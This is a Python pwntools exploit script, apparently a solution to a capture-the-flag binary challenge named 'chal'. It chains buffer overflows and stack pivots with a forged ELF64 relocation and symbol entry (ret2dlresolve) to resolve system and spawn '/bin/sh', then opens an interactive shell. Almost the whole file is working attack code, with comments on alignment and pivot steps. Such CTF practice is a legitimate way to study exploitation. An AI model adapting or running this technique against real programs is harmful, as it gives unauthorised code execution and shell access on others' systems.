from pwn import *

context.arch = "amd64"
def align(addr):
    return (0x18 - (addr) % 0x18)

bin = ELF('./chal')
#p = process('./chal')
p = gdb.debug('./chal', 'b *0x00401144\nc')

PLT = 0x0000000000401020 # .plt section
JMPREL = 0x0000000000400590 # .rela.plt section
SYMTAB = 0x00000000004003e0 # .symtab section
STRTAB = 0x0000000000400470 # .strtab section

offset = 0xd
bss = 0x404010
gets_rbp = 0x0040112e 

def wait():
    #p.recvrepeat(0.1)
    return

rbp = bss + 0x700
#need to do math to align reloc_offset and offset to symtab aligns to 0x18
resolvedata = bss + 0x720
resolvedata+= align(resolvedata - JMPREL)

reloc_offset = (resolvedata - JMPREL) // 0x18
evilsym = resolvedata + 0x10 #to help fake symtab index align
evilsym += align(evilsym - SYMTAB)

#32 bit alignment was 0x10 for dl resolve stuff, 64 bit is 0x18 for align, make sure it is all aligned
evil = flat( #faking a ELF64_REL
    resolvedata, #r_offset
    0x7 | ((evilsym + 0x18 - SYMTAB) // 0x18) << 32, #r_info
    0, 0, 0, #alignment here
    evilsym + 0x40 - STRTAB, 0, 0, 0, 0,
    b'system\x00\x00',
    b'/bin/sh\x00'
    )
#bin_sh = evilsym + 0x18 + 0x8 
bin_sh = 0x4047ad-offset
#gonna need rbp to be above the bare minimum because stack does operations there, trigger a read here
#read data into resolvedata 
payload = b'A' * offset + p64(0x405000-0x18-0x8*7) + p64(gets_rbp)
wait()
p.sendline(payload)
#final rop chain 
payload = b'a'*0xd+p64(bin_sh-0x10)+p64(gets_rbp)+p64(bin_sh+0xd)+p64(gets_rbp)+p64(0)+p64(PLT)+p64(reloc_offset)
wait()
p.sendline(payload)
# second stage of final rop chain, just stack pivot to our final location 
payload = b'a'*0xd+p64(0x404f00)+p64(gets_rbp)+b'a'*0xd+p64(0x405000-0x18-0x8*3)+p64(0x00401144)
#print('next write to',hex(resolvedata-0x10))
# we need to pivot to somewhere sane before calling the dynamic loader so there's stack space
# overwrite gets got so gets_rbp becomes mov rdi, [rbp-0xd] lol 
payload = b'a'*0xd+p64(resolvedata-0x10)+p64(gets_rbp)
wait()
p.sendline(payload)
wait()
p.sendline(b'A'*offset+p64(bin.got['gets']+0xd)+p64(gets_rbp)+evil)
#input('stack pivot')
payload = p64(0x00401145)+b'A'*(offset-0x8)+p64(0x405000-0x18-0x8*5) + p64(0x00401144) # leave ; ret  
wait()
p.sendline(payload)
p.interactive()

